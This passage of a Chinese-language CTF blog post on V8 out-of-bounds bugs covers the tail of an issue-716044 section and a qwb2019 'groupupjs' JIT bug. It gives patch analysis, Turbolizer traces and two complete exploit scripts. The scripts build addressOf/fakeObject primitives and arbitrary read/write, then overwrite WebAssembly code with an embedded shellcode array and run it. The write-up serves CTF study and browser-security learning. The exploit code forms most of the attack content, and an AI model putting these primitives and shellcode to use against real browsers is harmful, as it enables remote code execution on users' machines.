<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  Node* result =</span><br><span class="line">      CallStub(slow_case_continuation, context(), receiver(), callbackfn(),</span><br><span class="line">               this_arg(), a_.value(), o(), k_.value(), len(), to_.value());</span><br><span class="line"></span><br><span class="line">Node* len() &#123; return len_; &#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>既然能越界写，那么我们就越界覆盖后方Array对象的length，进而构造一个oob的arr，然后利用手法就和前面一样了。<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_l(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64_h(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getUint32(4,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var oob_double_arr;</span><br><span class="line">var obj_arr;</span><br><span class="line">var arb_buf;</span><br><span class="line"></span><br><span class="line">class Array1 extends Array &#123;</span><br><span class="line">  constructor(len) &#123;</span><br><span class="line">      super(1); //将数组长度缩减为1</span><br><span class="line">      oob_double_arr = [1.1,2.2];</span><br><span class="line">      obj_arr = [obj];</span><br><span class="line">      arb_buf = new ArrayBuffer(0x10);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">class MyArray extends Array &#123;</span><br><span class="line">  static get [Symbol.species]() &#123;</span><br><span class="line">      return Array1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = new MyArray();</span><br><span class="line"></span><br><span class="line">//第8个位置将会写入数据</span><br><span class="line">a[8] = 0x1;</span><br><span class="line">//OOB</span><br><span class="line">var b = a.map(function(x) &#123; return 1000; &#125;);</span><br><span class="line"></span><br><span class="line">var array_buffer_map = oob_double_arr[0xe];</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   obj_arr[0] = obj;</span><br><span class="line">   var addr = oob_double_arr[0xd];</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr_h,addr_l) &#123;</span><br><span class="line">   oob_double_arr[0xd] = p64f(addr_l,addr_h);</span><br><span class="line">   var mobj = obj_arr[0];</span><br><span class="line">   return mobj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var d = addressOf(func);</span><br><span class="line">var wasm_shellcode_ptr_addr_h = u64_h(d);</span><br><span class="line">var wasm_shellcode_ptr_addr_l = u64_l(d) - 0x1 + 0x38;</span><br><span class="line"></span><br><span class="line">oob_double_arr[0x11] = p64f(0,0xffff);</span><br><span class="line">oob_double_arr[0x12] = p64f(wasm_shellcode_ptr_addr_l,wasm_shellcode_ptr_addr_h);</span><br><span class="line"></span><br><span class="line">var adv = new DataView(arb_buf);</span><br><span class="line">var wasm_shellcode_addr_l = adv.getUint32(0,true);</span><br><span class="line">var wasm_shellcode_addr_h = adv.getUint32(4,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));</span><br><span class="line">oob_double_arr[0x12] = p64f(wasm_shellcode_addr_l,wasm_shellcode_addr_h);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<h2 id="0x04-JIT中的OOB"><a href="#0x04-JIT中的OOB" class="headerlink" title="0x04 JIT中的OOB"></a>0x04 JIT中的OOB</h2><h3 id="0x04-00-qwb2019-final-groupupjs"><a href="#0x04-00-qwb2019-final-groupupjs" class="headerlink" title="0x04.00 qwb2019-final-groupupjs"></a>0x04.00 qwb2019-final-groupupjs</h3><h4 id="patch分析-5"><a href="#patch分析-5" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line">--- a/src/compiler/machine-operator-reducer.cc</span><br><span class="line">+++ b/src/compiler/machine-operator-reducer.cc</span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    // K &lt; K =&gt; K</span><br><span class="line">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure>
<p>该patch打在<code>MachineOperatorReducer::Reduce</code>函数中，可以推测这个漏洞与JIT编译器有关。<br>JIT中的IR优化流程如下<br><img src="https://p3.ssl.qhimg.com/t01f85776de52c12000.png"><br>其中MachineOperatorReducer发生在Reduce阶段也就是图中<code>SimplifiedLoweringPhase</code>阶段，<code>MachineOperatorReducer::Reduce</code>会将IR中间代码中的一些可以在编译时就计算出的条件直接优化为一个布尔值。<br>而我们的patch正好打在了<code>IrOpcode::kInt32LessThan</code>分支，也就是如果IR代码中有<code>kInt32LessThan</code>的代码调用，将会出现问题，可以溢出一个单位。<br>而数组的length则是Int32类型，尝试写出如下的测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function opt(x) &#123;</span><br><span class="line">   var a = [1.1,2.2,3.3,4.4];</span><br><span class="line">   return a[4];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(i));</span><br></pre></td></tr></table></figure>
<p>发现并没有发生溢出，为了追踪优化过程，我们v8自带的<code>Turbolizer</code>来查看v8生成的IR图，执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 1.js --trace-turbo --trace-turbo-path ../</span><br></pre></td></tr></table></figure>
<p>生成IR图，然后用<code>Turbolizer</code>打开查看<br><img src="https://p5.ssl.qhimg.com/t0171b06a0cc24db44d.png"><br>发现其在<code>LoadElimination Phase</code>阶段，直接使用<code>CheckBounds</code>来进行检查了，也就是还未到达<code>SimplifiedLoweringPhase</code>阶段时，JIT就已经知道这个为越界的访问。因此，我们可以将4包裹在一个字典对象里，这样在<code>LoadElimination Phase</code>阶段，JIT就不知道越界了，因为后面还要进行<code>Escape Analyse</code>才能知道值。<br>于是代码修改为这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function opt(x) &#123;</span><br><span class="line">   var a = [1.1,2.2,3.3,4.4];</span><br><span class="line">   var e = &#123;a:4&#125;</span><br><span class="line">   return a[e.a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   opt(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(opt(i));</span><br></pre></td></tr></table></figure>
<p>可以发现输出了一个double值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop/qwb2019-final-groupupjs/x64.debug# ./d8 1.js --trace-turbo --trace-turbo-path ../</span><br><span class="line">Concurrent recompilation has been disabled for tracing.</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method opt using TurboFan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method opt using TurboFan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Begin compiling method  using TurboFan</span><br><span class="line">---------------------------------------------------</span><br><span class="line">Finished compiling method  using TurboFan</span><br><span class="line">-1.1885946300594787e+148</span><br></pre></td></tr></table></figure>
<p>这回由于信息不足，不能在<code>LoadElimination Phase</code>阶段确定，因此仅检查了最大范围<br><img src="https://p0.ssl.qhimg.com/t01192cf4d59c3c83d0.png"><br>然后在<code>SimplifiedLoweringPhase</code>阶段，用了<code>Uint32LessThan</code>，由于<code>Uint32LessThan</code>被patch过，因此结果为True，那么就可以越界访问了。<br><img src="https://p4.ssl.qhimg.com/t0138511d34d43f8f2a.png"></p>
<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造出一个oob数组后，改写数组对象的MAP，然后构造<code>addressOf</code>和<code>fakeObject</code>原语。<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var arr;</span><br><span class="line">var obj_arr;</span><br><span class="line">function opt()&#123;</span><br><span class="line">   arr = [1.1,2.2,3.3,4.4];</span><br><span class="line">   obj_arr = [arr];</span><br><span class="line">   var e = &#123;a:arr.length&#125;;</span><br><span class="line">   return arr[e.a];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for(var i=0; i &lt; 0x20000; i++)&#123;</span><br><span class="line">    opt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var double_element_map = opt();</span><br><span class="line"></span><br><span class="line">//print(u64f(double_element_map).toString(16));</span><br><span class="line">var obj_element_map = i2f64(u64f(double_element_map) + 0xa0n);</span><br><span class="line">print((u64f(double_element_map)).toString(16));</span><br><span class="line"></span><br><span class="line">function fakeObject_opt(addr) &#123;</span><br><span class="line">   arr = [addr,2.2,3.3,4.4];</span><br><span class="line">   var e = &#123;a:arr.length&#125;;</span><br><span class="line">   arr[e.a] = obj_element_map;</span><br><span class="line">   return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//JIT优化</span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   fakeObject_opt(double_element_map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   return fakeObject_opt(i2f64(addr + 0x1n))[0];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获得MAP对象</span><br><span class="line">var double_element_map_obj = fakeObject_opt(double_element_map)[0];</span><br><span class="line"></span><br><span class="line">//print(double_element_map_obj);</span><br><span class="line"></span><br><span class="line">function addressOf_opt(obj) &#123;</span><br><span class="line">   var arr = [obj,obj,obj,obj];</span><br><span class="line">   var e = &#123;a:arr.length&#125;;</span><br><span class="line">   arr[e.a] = double_element_map_obj;</span><br><span class="line">   return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//JIT优化</span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   addressOf_opt(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf(obj) &#123;</span><br><span class="line">   var v = addressOf_opt(obj)[0];</span><br><span class="line">   return u64f(v) - 0x1n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];</span><br><span class="line">var arb_buf = new ArrayBuffer(0x10);</span><br><span class="line">var faker_addr = addressOf(faker);</span><br><span class="line">print(&#x27;faker_addr=&#x27;+faker_addr.toString(16));</span><br><span class="line">wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x88n;</span><br><span class="line">var element_addr = faker_addr - 0x60n;</span><br><span class="line">print(&#x27;element_addr=&#x27; + element_addr.toString(16));</span><br><span class="line">//fake a FixedDoubleArray</span><br><span class="line">faker[0] = double_element_map;</span><br><span class="line">faker[1] = i2f64(0n);</span><br><span class="line">faker[2] = i2f64(element_addr+0x1n);</span><br><span class="line">faker[3] = i2f64(0x300000000000n);</span><br><span class="line"></span><br><span class="line">var oob_arr = fakeObject(element_addr + 0x10n);</span><br><span class="line">oob_arr[0x11] = i2f64(0x1000n); //修改ArrayBuffer的length</span><br><span class="line">oob_arr[0x12] = i2f64(wasm_shellcode_ptr_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var adv = new DataView(arb_buf);</span><br><span class="line">var wasm_shellcode_addr = adv.getBigUint64(0,true);</span><br><span class="line">print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));</span><br><span class="line"></span><br><span class="line">oob_arr[0x12] = i2f64(wasm_shellcode_addr);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//%SystemBreak();</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<h2 id="0x05-感想"><a href="#0x05-感想" class="headerlink" title="0x05 感想"></a>0x05 感想</h2><p>oob类型的v8漏洞，其利用手法大多相似，不同点在于如何构造出oob数组。从一开始的直入主题到一般情况再到回调函数中的oob以及JIT中的oob，收获了许多知识。</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/12/24/%E5%8D%8E%E4%B8%BACTF2020%E7%AC%AC%E4%BA%8C%E5%9C%BA-HONORBOOK/" rel="prev" title="华为CTF2020第二场_HONORBOOK">
      <i class="fa fa-chevron-left"></i> 华为CTF2020第二场_HONORBOOK
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020-PowerSystem/" rel="next" title="纵横杯2020_PowerSystem">
      纵横杯2020_PowerSystem <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%99%AE%E9%80%9AOOB"><span class="nav-number">3.</span> <span class="nav-text">0x02 普通OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-00-starctf2019-oob"><span class="nav-number">3.1.</span> <span class="nav-text">0x02.00 starctf2019-oob</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-01-xnuca2020-babyV8"><span class="nav-number">3.2.</span> <span class="nav-text">0x02.01 xnuca2020-babyV8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-callback%E4%B8%AD%E7%9A%84OOB"><span class="nav-number">4.</span> <span class="nav-text">0x03 callback中的OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-00-%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E-final-browser"><span class="nav-number">4.1.</span> <span class="nav-text">0x03.00 数字经济-final-browser</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="nav-number">4.1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-01-plaidctf2018-roll-a-d8"><span class="nav-number">4.2.</span> <span class="nav-text">0x03.01 plaidctf2018-roll_a_d8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-3"><span class="nav-number">4.2.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-3"><span class="nav-number">4.2.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-02-issue-716044"><span class="nav-number">4.3.</span> <span class="nav-text">0x03.02 issue 716044</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-4"><span class="nav-number">4.3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-4"><span class="nav-number">4.3.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-JIT%E4%B8%AD%E7%9A%84OOB"><span class="nav-number">5.</span> <span class="nav-text">0x04 JIT中的OOB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-00-qwb2019-final-groupupjs"><span class="nav-number">5.1.</span> <span class="nav-text">0x04.00 qwb2019-final-groupupjs</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90-5"><span class="nav-number">5.1.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-5"><span class="nav-number">5.1.2.</span> <span 